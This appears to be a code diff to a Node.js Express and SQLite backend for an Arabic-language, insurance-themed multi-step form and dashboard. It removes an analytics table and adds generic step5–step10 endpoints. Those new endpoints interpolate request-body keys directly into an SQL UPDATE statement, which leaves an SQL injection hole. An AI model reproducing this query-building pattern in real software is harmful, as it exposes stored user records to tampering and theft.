@@ -4,7 +4,6 @@ const helmet = require('helmet');
 const morgan = require('morgan');
 const sqlite3 = require('sqlite3').verbose();
 const { v4: uuidv4 } = require('uuid');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -53,25 +52,6 @@ function initializeDatabase() {
       status TEXT DEFAULT 'جديد'
     )
   `);
-
-  db.run(`
-    CREATE TABLE IF NOT EXISTS analytics (
-      id TEXT PRIMARY KEY,
-      date DATE,
-      total_submissions INTEGER,
-      step1_count INTEGER,
-      step2_count INTEGER,
-      step3_count INTEGER,
-      step4_count INTEGER,
-      step5_count INTEGER,
-      step6_count INTEGER,
-      step7_count INTEGER,
-      step8_count INTEGER,
-      step9_count INTEGER,
-      step10_count INTEGER,
-      completed_count INTEGER
-    )
-  `);
 }
 
 // API Endpoints
@@ -104,7 +84,6 @@ app.post('/api/step1', (req, res) => {
         res.status(500).json({ error: 'خطأ في حفظ البيانات' });
       } else {
         res.json({ success: true, id: id });
-        updateAnalytics(1);
       }
     });
     
@@ -137,7 +116,6 @@ app.post('/api/step2', (req, res) => {
         res.status(500).json({ error: 'خطأ في حفظ البيانات' });
       } else {
         res.json({ success: true });
-        updateAnalytics(2);
       }
     });
     
@@ -164,11 +142,10 @@ app.post('/api/step3', (req, res) => {
       data.idNumber
     ], function(err) {
       if (err) {
-        console.error('خطأ في تحديث البيانات:', err);
+        console.error('خطأ في حفظ البيانات:', err);
         res.status(500).json({ error: 'خطأ في حفظ البيانات' });
       } else {
         res.json({ success: true });
-        updateAnalytics(3);
       }
     });
     
@@ -194,11 +171,10 @@ app.post('/api/step4', (req, res) => {
       data.idNumber
     ], function(err) {
       if (err) {
-        console.error('خطأ في تحديث البيانات:', err);
+        console.error('خطأ في حفظ البيانات:', err);
         res.status(500).json({ error: 'خطأ في حفظ البيانات' });
       } else {
         res.json({ success: true });
-        updateAnalytics(4);
       }
     });
     
@@ -229,7 +205,6 @@ app.post('/api/final', (req, res) => {
         res.status(500).json({ error: 'خطأ في حفظ البيانات' });
       } else {
         res.json({ success: true });
-        updateAnalytics(5);
       }
     });
     
@@ -237,6 +212,39 @@ app.post('/api/final', (req, res) => {
     console.error('خطأ في معالجة البيانات النهائية:', error);
     res.status(500).json({ error: 'خطأ في الخادم' });
   }
+});
+
+// دعم خطوات إضافية للتوافق مع جميع ملفات الموقع
+['step5', 'step6', 'step7', 'step8', 'step9', 'step10'].forEach(stepName => {
+  app.post(`/api/${stepName}`, (req, res) => {
+    try {
+      const data = req.body;
+      const stepNum = parseInt(stepName.replace('step', ''));
+      
+      // حفظ البيانات الواردة
+      const stmt = db.prepare(`
+        UPDATE submissions SET 
+          ${Object.keys(data).map(key => `${key} = ?`).join(', ')},
+          step = ?
+        WHERE idNumber = ? AND step < ?
+      `);
+      
+      const values = [...Object.values(data), stepNum, data.idNumber, stepNum];
+      
+      stmt.run(values, function(err) {
+        if (err) {
+          console.error(`خطأ في حفظ البيانات للخطوة ${stepNum}:`, err);
+          res.status(500).json({ error: 'خطأ في حفظ البيانات' });
+        } else {
+          res.json({ success: true });
+        }
+      });
+      
+    } catch (error) {
+      console.error(`خطأ في معالجة البيانات للخطوة ${stepName}:`, error);
+      res.status(500).json({ error: 'خطأ في الخادم' });
+    }
+  });
 });
 
 // جلب جميع البيانات
@@ -308,34 +316,6 @@ app.get('/api/stats', (req, res) => {
   });
 });
 
-// تحديث الإحصائيات
-function updateAnalytics(step) {
-  const today = new Date().toISOString().split('T')[0];
-  
-  db.get('SELECT * FROM analytics WHERE date = ?', [today], (err, row) => {
-    if (err) {
-      console.error('خطأ في جلب الإحصائيات:', err);
-      return;
-    }
-    
-    if (row) {
-      // تحديث الموجود
-      const updateStmt = `UPDATE analytics SET step${step}_count = step${step}_count + 1`;
-      if (step === 5) {
-        updateStmt += ', completed_count = completed_count + 1, total_submissions = total_submissions + 1';
-      }
-      db.run(updateStmt, [today]);
-    } else {
-      // إنشاء جديد
-      const insertStmt = `
-        INSERT INTO analytics (id, date, total_submissions, step1_count, step2_count, step3_count, step4_count, step5_count, completed_count)
-        VALUES (?, ?, 1, 0, 0, 0, 0, 0, 0)
-      `;
-      db.run(insertStmt, [uuidv4(), today]);
-    }
-  });
-}
-
 // صفحة البداية
 app.get('/', (req, res) => {
   res.redirect('/dashboard.html');
@@ -405,8 +385,8 @@ app.get('/api-status', (req, res) => {
         .links a:hover {
           background: rgba(255,255,255,0.3);
         }
-      </head>
-    </style>
+      </style>
+    </head>
     <body>
       <div class="container">
         <h1>🚀 تأميني - Dashboard API</h1>
@@ -419,6 +399,7 @@ app.get('/api-status', (req, res) => {
           <div class="api-endpoint">POST /api/step2 - بيانات الخطوة الثانية</div>
           <div class="api-endpoint">POST /api/step3 - بيانات الخطوة الثالثة</div>
           <div class="api-endpoint">POST /api/step4 - بيانات الخطوة الرابعة</div>
+          <div class="api-endpoint">POST /api/step5-10 - خطوات إضافية</div>
           <div class="api-endpoint">POST /api/final - البيانات النهائية</div>
           <div class="api-endpoint">GET /api/submissions - عرض جميع البيانات</div>
           <div class="api-endpoint">GET /api/stats - الإحصائيات السريعة</div>
